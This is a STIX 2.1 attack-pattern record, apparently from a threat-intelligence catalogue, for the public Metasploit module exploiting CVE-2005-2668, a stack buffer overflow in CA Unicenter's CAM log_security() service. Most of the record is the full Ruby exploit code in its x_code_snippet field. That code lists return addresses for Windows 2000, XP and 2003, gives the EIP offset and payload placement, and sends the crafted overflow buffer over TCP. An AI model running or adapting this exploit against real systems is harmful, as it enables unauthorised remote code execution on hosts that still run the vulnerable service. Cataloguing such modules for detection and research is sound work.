{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--febf04a6-2f92-48a7-b7fc-114fcfc79202",
    "created": "2024-08-14T16:35:24.1658Z",
    "modified": "2024-08-14T16:35:24.165803Z",
    "name": "CA CAM log_security() Stack Buffer Overflow (Win32)",
    "description": " This module exploits a vulnerability in the CA CAM service by passing a long parameter to the log_security() function. The CAM service is part of TNG Unicenter. This module has been tested on Unicenter v3.1. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/unicenter/cam_log_security.rb",
            "external_id": "cam_log_security.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-2668"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'CA CAM log_security() Stack Buffer Overflow (Win32)',\n      'Description'    => %q{\n          This module exploits a vulnerability in the CA CAM service\n        by passing a long parameter to the log_security() function.\n        The CAM service is part of TNG Unicenter. This module has\n        been tested on Unicenter v3.1.\n      },\n      'Author'         => [ 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2005-2668'],\n          ['OSVDB', '18916'],\n          ['BID', '14622'],\n        ],\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n          'BadChars' => \"\\x00\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'      => %w{ win },\n      'Targets'        =>\n        [\n          # W2API.DLL @ 0x01950000 - return to ESI\n          ['W2API.DLL TNG 2.3',  { 'Platform' => 'win', 'Ret' => 0x01951107 }],\n\n          # Return to ESI in ws2help.dll\n          ['Windows 2000 SP0-SP4 English', { 'Platform' => 'win', 'Ret' => 0x750217ae }],\n          ['Windows XP SP0-SP1 English',   { 'Platform' => 'win', 'Ret' => 0x71aa16e5 }],\n          ['Windows XP SP2 English',       { 'Platform' => 'win', 'Ret' => 0x71aa1b22 }],\n          ['Windows 2003 SP0 English',     { 'Platform' => 'win', 'Ret' => 0x71bf175f }],\n        ],\n      'DisclosureDate' => '2005-08-22',\n      'DefaultTarget' => 0))\n  end\n\n\n  def check\n    connect\n    ack = sock.get_once || ''\n    disconnect\n\n    (ack == \"ACK\\x00\") ? Exploit::CheckCode::Detected : Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    connect\n\n    ack = sock.get_once\n    if (ack != \"ACK\\x00\")\n      print_status(\"The CAM service is not responding\")\n    end\n\n    buf = rand_text_english(4096, payload_badchars)\n\n    # Offset 1016 for EIP, 1024 = ESP, 1052 = ESI\n    buf[ 1016, 4 ] = [target.ret].pack('V')\n    buf[ 1052, payload.encoded.length ] = payload.encoded\n\n    sock.put(\"\\xfa\\xf9\\x00\\x10\" + buf + \"\\x00\")\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2005-08-22",
    "x_mitre_platforms": [
        "%w{ win }"
    ]
}